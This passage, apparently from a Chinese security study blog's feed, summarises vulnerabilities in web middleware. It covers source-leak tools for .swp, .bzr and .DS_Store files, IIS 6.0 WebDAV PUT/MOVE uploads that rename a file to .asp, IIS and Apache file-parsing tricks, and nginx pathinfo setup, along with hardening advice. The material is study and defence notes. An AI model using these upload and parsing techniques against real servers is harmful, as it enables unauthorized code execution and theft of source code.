http:&#x2F;&#x2F;www.steady.com&#x2F;CVS&#x2F;）</span><br></pre></td></tr></table></figure><h3 id="SWP文件泄露"><a href="#SWP文件泄露" class="headerlink" title="SWP文件泄露"></a>SWP文件泄露</h3><p><strong>swp</strong>文件即<strong>swap</strong>文件，在编辑文件时产生的临时文件，为隐藏文件，如果文件未正常退出，该临时文件就会自动保存，文件名为**.xxx.swp**</p><h4 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim打开，打开命令：vim -r steady.php.swp</span><br></pre></td></tr></table></figure><h3 id="bzr源码泄漏"><a href="#bzr源码泄漏" class="headerlink" title="bzr源码泄漏"></a>bzr源码泄漏</h3><p>bzr也是个版本控制工具，bzr在初始化项目时(bzr init/init-repo), 会在项目根目录产生名为.bzr的隐藏目录, 同样暴露了源代码和用户信息。</p><h4 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>dvcs-ripper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rip-bzr.pl -v -u http:&#x2F;&#x2F;www.example.com&#x2F;.bzr&#x2F;</span><br></pre></td></tr></table></figure><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件的图标位置或者是背景色的选择。相当于 Windows 下的 desktop.ini。</p><p>在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。</p><h4 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p><code>python ds_store_exp.py http://www.example.com/.DS_Store</code></p>]]></content>
      
      
      <categories>
          
          <category> 组件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 组件安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中间件漏洞</title>
      <link href="2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
      <url>2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="中间件漏洞总结"><a href="#中间件漏洞总结" class="headerlink" title="中间件漏洞总结"></a>中间件漏洞总结</h1><h2 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h2><h3 id="PUT漏洞"><a href="#PUT漏洞" class="headerlink" title="PUT漏洞"></a>PUT漏洞</h3><p>最初是Windows NT版本的可选包，随后内置在Windows 2000、Windows XP Professional和Windows Server 2003一起发行，但在Windows XP Home版本上并没有IIS。</p><p>IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，它使得在网络（包括互联网和局域网）上发布信息成了一件很容易的事。</p><h4 id="漏洞介绍及成因"><a href="#漏洞介绍及成因" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。</p><p>版本：IIS6.0</p><h4 id="漏洞前提"><a href="#漏洞前提" class="headerlink" title="漏洞前提"></a>漏洞前提</h4><p>IIS 6.0开启了WebDAV并且拥有IIS来宾用户拥有写入权限，并且知道网站根目录。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>1）开启WebDAV 和写权限</p><p>2）利用burp测试</p><ul><li><p>抓包，将GET请求改为OPTIONS。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">options 请求属于浏览器的预检请求，查看服务器是否接受请求，预检通过后，浏览器才会去发 get， post， put， delete 等请求。</span><br></pre></td></tr></table></figure></li><li><p>用PUT上传一个txt文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PUT /test.txt HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br><span class="line">Content-Length:<span class="number">27</span></span><br><span class="line"></span><br><span class="line">steady <span class="keyword">is</span> very cool</span><br></pre></td></tr></table></figure><p>成功上传。</p></li><li><p>用PUT上传一个ASP文件，这时候是禁止上传ASP文件</p></li><li><p>使用MOVE请求方法，并利用刚刚上传的上去的test.txt，修改文件后缀。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MOVE &#x2F;test.txt HTTP&#x2F;1.1</span><br><span class="line">Host: 127.0.0.1</span><br><span class="line">Destination: http:&#x2F;&#x2F;127.0.0.1&#x2F;aaa.asp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MOVE方式 将指定的资源移动到Destination消息头指定的位置</span><br></pre></td></tr></table></figure></li></ul><h3 id="短文件名猜解"><a href="#短文件名猜解" class="headerlink" title="短文件名猜解"></a>短文件名猜解</h3><h3 id="远程代码执行"><a href="#远程代码执行" class="headerlink" title="远程代码执行"></a>远程代码执行</h3><h4 id="漏洞介绍及成因-1"><a href="#漏洞介绍及成因-1" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。</p><h4 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>利用poc</p><h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="漏洞介绍及成因-2"><a href="#漏洞介绍及成因-2" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>IIS6.0 在处理含有特殊符号的文件路径时会出现逻辑错误。</p><h4 id="漏洞前提1"><a href="#漏洞前提1" class="headerlink" title="漏洞前提1"></a>漏洞前提1</h4><p>IIS6.0</p><h4 id="漏洞复现1"><a href="#漏洞复现1" class="headerlink" title="漏洞复现1"></a>漏洞复现1</h4><p>利用方式1</p><p>新建一个名字为test.asp的目录，然后访问该目录下的所有文件，都会被当作asp执行。</p><p>访问路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp&#x2F;1.jpg</span><br></pre></td></tr></table></figure><p>利用方式2</p><p>第二种是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行</p><p>访问路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;test.asp;.jpg</span><br></pre></td></tr></table></figure><h4 id="漏洞前提2"><a href="#漏洞前提2" class="headerlink" title="漏洞前提2"></a>漏洞前提2</h4><p>IIS7.5</p><h4 id="漏洞复现2"><a href="#漏洞复现2" class="headerlink" title="漏洞复现2"></a>漏洞复现2</h4><p>URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，php默认开启 “cgi.fix_pathinfo”, 会对文件进行 “修理” 。若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。</p><h4 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h4><p>1、过滤.asp/xm.jpg，通过ISApi组件过滤。</p><p>2、对新建目录文件名进行过滤，不允许新建包含‘.‘的文件。</p><p>3、限制上传的脚本执行权限，不允许执行脚本</p><h2 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h2><h3 id="apache学习"><a href="#apache学习" class="headerlink" title="apache学习"></a>apache学习</h3><h4 id="apache配置文件"><a href="#apache配置文件" class="headerlink" title="apache配置文件"></a>apache配置文件</h4><p>主要的配置文件在conf文件夹中,额外的存在于conf.d文件夹中,我们如果不想单独的去修改主要的配置文件http.d,我们可以临时的在conf.d中新建立一个conf文件,来修改和添加我们的配置,最终我们可以在主配置文件中使用命令Include去包涵我们的配置文件。</p><h4 id="apache与php的结合"><a href="#apache与php的结合" class="headerlink" title="apache与php的结合"></a>apache与php的结合</h4><p>1、CGI</p><p>2、FastCGI</p><p>3、Module</p><p>在https.conf(主配置文件)或者单独的配置文件中都可以使用&lt;IfModule&gt;指令来加载php_module。</p><h4 id="apache的配置指令"><a href="#apache的配置指令" class="headerlink" title="apache的配置指令"></a>apache的配置指令</h4><h5 id="lt-Directory-gt-指令"><a href="#lt-Directory-gt-指令" class="headerlink" title="&lt;Directory&gt;指令"></a>&lt;Directory&gt;指令</h5><p>&lt;Directory&gt;和&lt;/Directory&gt;用于封装一组指令，使之仅对某个目录及其子目录生效。</p><p>语法：&lt;Directory Directory-path&gt; … &lt;/Directory&gt;。</p><h5 id="lt-Files-gt-指令"><a href="#lt-Files-gt-指令" class="headerlink" title="&lt;Files&gt;指令"></a>&lt;Files&gt;指令</h5><p>提供基于文件名的访问控制，类似于&lt;Directory&gt;和&lt;Location&gt;指令。</p><p>语法：&lt;Files filename&gt; …&lt;/Files&gt;</p><p>&lt;Files&gt;能嵌入到&lt;Directory&gt;段中以限制它们作用的文件系统范围。</p><p>filename参数应当是一个文件名或是一个包含通配符的字符串，其中”?”匹配任何单个字符，”*”匹配任何字符串序列。在”~”字符之后同样可以使用正则表达式。</p><h5 id="lt-FilesMatch-gt-指令"><a href="#lt-FilesMatch-gt-指令" class="headerlink" title="&lt;FilesMatch&gt;指令"></a>&lt;FilesMatch&gt;指令</h5><p>包含作用于与正则表达式匹配的文件名的指令</p><p>语法&lt;FilesMatch regex&gt; …&lt;/FilesMatch&gt;</p><p>&lt;FilesMatch&gt;指令就像&lt;Files&gt;指令一样提供了针对文件名的访问控制。然而，它使用的是正则表达式。比如说：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.(gif|jpe?g|png)$&quot;&gt;</span><br></pre></td></tr></table></figure><p>将匹配最常见的internet图形文件格式。 </p><h5 id="lt-Location-gt-指令"><a href="#lt-Location-gt-指令" class="headerlink" title="&lt;Location&gt;指令"></a>&lt;Location&gt;指令</h5><p>将封装的指令作用于匹配的URL。</p><p>例如，拒绝访问任何以”/private”开头的URL路径。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocationMatch <span class="string">&quot;^/private&quot;</span>&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;/LocationMatch&gt;</span><br></pre></td></tr></table></figure><h5 id="lt-LocationMatch-gt-指令"><a href="#lt-LocationMatch-gt-指令" class="headerlink" title="&lt;LocationMatch&gt;指令"></a>&lt;LocationMatch&gt;指令</h5><p>将封装的指令作用于正则表达式匹配的URL。</p><p>&lt;LocationMatch&gt;和&lt;Location&gt;指令相同，提供了基于URL的访问控制。但它使用正则表达式作为参数，而不是简单字符串。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;LocationMatch &quot;&#x2F;(extra|special)&#x2F;data&quot;&gt;</span><br></pre></td></tr></table></figure><p>将匹配包含子串”/extra/data”或”/special/data”的URL。</p><p>更多介绍</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;jishume&#x2F;articles&#x2F;2079697.html</span><br></pre></td></tr></table></figure><h5 id="SetHandler指令"><a href="#SetHandler指令" class="headerlink" title="SetHandler指令"></a>SetHandler指令</h5><p>为具有特定文件 extensions 的文件配置特定处理程序。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch <span class="string">&quot;\.php$&quot;</span>&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><h5 id="AddType"><a href="#AddType" class="headerlink" title="AddType"></a>AddType</h5><p><code>AddType</code>指令在给定的文件扩展名与特定的内容类型之间建立映射关系。MIME-type指明了包含extension扩展名的文件的媒体类型。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。本指令可用来增加没有在媒体类型文件(参阅<code>TypesConfig</code>指令)中定义的映射关系。</p><h5 id="AddHandle"><a href="#AddHandle" class="headerlink" title="AddHandle"></a>AddHandle</h5><p>指定带extension扩展名的文件应被handler-name处理器来处理。这个映射关系会添加在所有有效的映射关系上，并覆盖所有相同的extension扩展名映射。例如，为了把扩展名为<code>.cgi</code>的文件作为CGI脚本来处理，你应该定义：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler cgi-script .cgi</span><br></pre></td></tr></table></figure><p>一旦将上述定义放在你的http.conf文件中，所有包含<code>.cgi</code>扩展名的文件，都会被当成是CGI程序。</p><p><code>AddHandler application/x-httpd-php .jpg</code>。</p><p>.jpg后缀的文件会交给php去处理,进而执行文件中的php代码。</p><h3 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><h4 id="漏洞介绍及成因-3"><a href="#漏洞介绍及成因-3" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>Apache文件解析漏洞与用户的配置有密切关系，严格来说属于用户配置问题。</p><p>Apache文件解析漏洞涉及到一个解析文件的特性：</p><p>Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.types内），则继续向左识别，当我们请求这样一个文件：steady.xxx.yyy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steady-&gt;无法识别，向左xxx-&gt;无法识别，向左-&gt;php-&gt;发现后缀是php，交给php处理这个文件。</span><br></pre></td></tr></table></figure><p>1.php.jpg成功的前提是:</p><ul><li><p>mime文件或者AddType没有设置jpg的对应的类型,apache识别不了jpg,进而识别PHP(大多数都能识别jpg)</p></li><li><p>配置文件使用<code>AddHandler</code>,以至于无论后缀文件是什么,有几个,只要看见该指令指定的文件类型,就交给php解析</p><p><code>AddHandler application/x-httpd-php 文件类型</code></p></li></ul><p>以上条件满足之一就可(1.php.xxx同理)</p><p>无论后缀有几个,有多少只要看见php就会被解析,前提:</p><ul><li>使用了AddHandle、&lt;FilesMatch&gt;</li></ul><h4 id="Apache的-htaccess利用技巧"><a href="#Apache的-htaccess利用技巧" class="headerlink" title="Apache的.htaccess利用技巧"></a>Apache的.htaccess利用技巧</h4><p><code>.htaccess</code> 文件提供了针对目录改变配置的方法， 即在一个特定的文档目录中放置一个包含一条或多条指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过 <code>Apache</code> 的 <code>AllowOverride</code> 指令来设置。</p><h6 id="作用范围"><a href="#作用范围" class="headerlink" title="作用范围"></a>作用范围</h6><p><code>.htaccess</code> 文件中的配置指令作用于 <code>.htaccess</code> 文件所在的目录及其所有子目录，子目录中的指令会覆盖父目录或者主配置文件中的指令。</p><h6 id="配置方式"><a href="#配置方式" class="headerlink" title="配置方式"></a>配置方式</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在服务器的主配置文件将 AllowOverride 设置为 All</span><br></pre></td></tr></table></figure><p>注意该文件的名字可以随意更改。</p><h6 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h6><p>1、htaccess文件</p><ul><li>&lt;Directory&gt;中配置<code>AllowOverride None </code></li></ul><p>也就是在当前目录下htaccess文件不起作用</p><ul><li>http.conf主配置文件中禁止该类文件运行</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Files &quot;.ht*&quot;&gt;</span><br><span class="line">    Require all denied</span><br><span class="line">&lt;&#x2F;Files&gt;</span><br></pre></td></tr></table></figure><p>2、php文件</p><ul><li>限制php的运行,直接使用&lt;Files&gt;禁止任何php的运行以及访问</li><li>如果想允许php文件的运行,使用&lt;FilesMatch&gt;中的正则表达式严格限制后缀,不建议使用AddHandle</li></ul><p>3、隐藏banner信息</p><p>ServerTokens OS　 修改为：ServerTokens Prod （在出现错误页的时候不显示服务器操作系统的名称）</p><p>ServerSignature On 修改为：ServerSignature Off（不回显apache版本信息）</p><p>4、删除默认网站及页面</p><p>删除默认的页面，防止泄露服务器信息</p><p>5、合理配置apache的运行账户</p><p>为apache单独建立一个运行账户及账户组，并在httpd.conf配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User apache</span><br><span class="line">Group apache</span><br></pre></td></tr></table></figure><p>6、合理控制apache运行账户对磁盘的写入，执行权限</p><p>取消apache运行账户对网站目录的写入权限，上传目录除外，其他非网站目录尽量不给权限</p><p>7、配置httpd.conf取消对上传目录的php执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">    &lt;FilesMatch &quot;.(php|php5)$&quot;&gt;     </span><br><span class="line">        Deny from all     </span><br><span class="line">    &lt;&#x2F;FilesMatch&gt; </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure><p>8、配置httpd.conf限制禁止访问的文件夹，例如后台目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">        Deny from all     </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure><p>9、配置httpd.conf限制一些特殊目录的特定ip访问，如内部接口等。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;Directory &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt;     </span><br><span class="line">    Order Deny,Allow</span><br><span class="line">    Deny from all</span><br><span class="line">    Allow from 192.168.1.111    </span><br><span class="line">&lt;&#x2F;Directory&gt; </span><br></pre></td></tr></table></figure><p>10、配置httpd.conf修改修改监听端口来防止一些内部系统被扫描</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Listen 12345 </span><br></pre></td></tr></table></figure><p>11、关闭对.htaccess的支持</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AllowOverride None </span><br></pre></td></tr></table></figure><h3 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h3><h4 id="漏洞介绍及成因-4"><a href="#漏洞介绍及成因-4" class="headerlink" title="漏洞介绍及成因"></a>漏洞介绍及成因</h4><p>由于配置错误导致的目录遍历。</p><h4 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>直接访问ip，比如127.0.0.1，可遍历路径。</p><p>修改apache配置文件httpd.conf</p><p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h2><h3 id="Nginx学习"><a href="#Nginx学习" class="headerlink" title="Nginx学习"></a>Nginx学习</h3><h4 id="nginx是如何解析php的"><a href="#nginx是如何解析php的" class="headerlink" title="nginx是如何解析php的?"></a>nginx是如何解析php的?</h4><h5 id="CGI、fast-cgi"><a href="#CGI、fast-cgi" class="headerlink" title="CGI、fast-cgi"></a>CGI、fast-cgi</h5><p>早期服务器只能解析html、js这样的静态资源,但是我们如果要想解析php这样的动态语言怎么办？服务器解析不了我们可以使用php解析器,然后解析器与服务器之间进行交流,不同的解析器与服务器进行交流要靠CGI协议,只要你按照CGI协议去编写程序,就能实现他们之间的交流.常见的php解析器(遵循CGI协议)有php-cgi、php-fpm.</p><p>对于cgi协议,服务器在每次接受到请求的时候都会fork一个进程,请求结束就要kill这个进程,有1000个请求,就要kill、fork1000次,很显然有点浪费.</p><p>Fast-cgi每次fork一个进程的时候,并不会去立即kill,而是一个fork可以处理多个请求。</p><p><strong>fast-cgi一个进程会处理多个请求,大大提高了效率</strong></p><p>php-fpm是一种利用fast-cgi的php解析器,提供进程管理的功能.</p><p>进程包含master和worker进程,master进程之后一个负责监听端口,接受服务器的请求,worker进程可以有多个,每一个进程内部都有php解析器,是php代码执行的地方.</p><h5 id="nginx与php-fpm"><a href="#nginx与php-fpm" class="headerlink" title="nginx与php-fpm"></a>nginx与php-fpm</h5><p>我们知道nginx有反向代理的功能,可以来处理客户端、服务端之间的请求和相应,而php-fpm在这里可以说是一个代理服务器的作用,nginx服务器接受到文件不会去处理,会交给php解析器php-fpm。</p><p>nginx.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php$ &#123;</span><br><span class="line">    root           /Applications/MxSrvs/www;</span><br><span class="line">    <span class="comment">//后面的地址就是php解析器,php-fpm的的地址</span></span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">10080</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">   <span class="comment">//设置传递给php解析器的参数值,以下的路径是指在安装php-fpm主机上存放php文件的路径</span></span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">  <span class="comment">//SCRIPT_FILENAME是什么呢？他是一个参数,我们nginx需要把参数传递给&quot;代理服务器&quot;php-fpm,后面的就是参数的值,只不过他们是由固定变量组成的</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>常见的参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fastcgi_param SCRIPT_FILENAME $documentroot$fastcgi_script_name;#脚本文件请求的路径</span><br><span class="line">fastcgi_param QUERY_STRING $query_string; #请求的参数;如?app&#x3D;123</span><br><span class="line">fastcgi_param REQUEST_METHOD $request_method; #请求的动作(GET,POST)</span><br><span class="line">fastcgi_param CONTENT_TYPE $content_type; #请求头中的Content-Type字段</span><br><span class="line">fastcgi_param CONTENT_LENGTH $content_length; #请求头中的Content-length字段。</span><br><span class="line">fastcgi_param SCRIPT_NAME $fastcgi_script_name; #脚本名称</span><br><span class="line">fastcgi_param REQUEST_URI $request_uri; #请求的地址不带参数</span><br><span class="line">fastcgi_param DOCUMENT_URI document_uri; #与document_uri; #与uri相同。</span><br><span class="line">fastcgi_param DOCUMENT_ROOT $document_root; #网站的根目录。在server配置中root指令中指定的值</span><br><span class="line">fastcgi_param PATH_INFO $path_info;#可自定义变量</span><br></pre></td></tr></table></figure><h5 id="常规流程"><a href="#常规流程" class="headerlink" title="常规流程"></a>常规流程</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">www.example.com</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">      Nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">路由到www.example.com&#x2F;index.php</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">加载nginx的fast-cgi模块</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">fast-cgi监听127.0.0.1:9000地址</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">www.example.com&#x2F;index.php请求到达127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 监听127.0.0.1:9000</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 接收到请求，启用worker进程处理请求</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">php-fpm 处理完请求，返回给nginx</span><br><span class="line">        |</span><br><span class="line">        |</span><br><span class="line">nginx将结果通过http返回给浏览器</span><br></pre></td></tr></table></figure><h4 id="nginx的pathinfo配置"><a href="#nginx的pathinfo配置" class="headerlink" title="nginx的pathinfo配置"></a>nginx的pathinfo配置</h4><p>讲之前我们需要理解一下伪静态,静态是指静态页面比如html、css等,没有页面交互,动态自然指的是动态页面,有页面交互,伪静态就是动态页面的静态表现.</p><p>我们在开发的时候经常使用MVC模式,由此我们在URL中访问网站也需要指定M、V、C参数,比如<code>http://www.cxzaixian.com/index.php?m=topic&amp;a=detail&amp;tid=82</code>,转化为伪静态之后是<code>http://www.cxzaixian.com/index.php/topic/detail/tid/82.html</code>.</p><p>后台代码拿到为静态URL之后,由相应的解析逻辑代码进行转化</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apache服务器本身是支持pathinfo的，通过简单修改几项配置即可。当配置支持pathinfo后，在php应用程序中，通过_SERVER[&#39;PATH_INFO&#39;]变量获取pathinfo值为&#x2F;topic&#x2F;detail&#x2F;tid&#x2F;82.html。 我们就可以很容易通过php逻辑代码来解析出controller文件、action方法、以及剩余的动态参数，进而就可以返回正确的网页响应。</span><br><span class="line">但是我们要说的nginx服务器默认是不支持pathinfo模式访问。实质上就是nginx不会去设置环境变量PATH_INFO 的值，导致php应用程序不能通过_SERVER[&#39;PAHT_INFO&#39;]来获取path_info, 也就不能解析出对应的动态参数。</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">location ~ \.php &#123;</span><br><span class="line">    root           html;</span><br><span class="line">    fastcgi_pass   <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</span><br><span class="line">    fastcgi_index  index.php;</span><br><span class="line">    fastcgi_param  SCRIPT_FILENAME  $document_root$fastcgi_script_name;</span><br><span class="line">    <span class="keyword">include</span>        fastcgi_params;</span><br><span class="line">    <span class="comment">#定义变量 $path_info ，用于存放pathinfo信息</span></span><br><span class="line">    set $path_info <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">#定义变量 $real_script_name，用于存放真实地址</span></span><br><span class="line">    set $real_script_name $fastcgi_script_name;</span><br><span class="line">    <span class="comment">#如果地址与引号内的正则表达式匹配</span></span><br><span class="line">    <span class="keyword">if</span> ($fastcgi_script_name ~ <span class="string">&quot;^(.+?\.php)(/.+)$&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">#将文件地址赋值给变量 $real_script_name</span></span><br><span class="line">        set $real_script_name 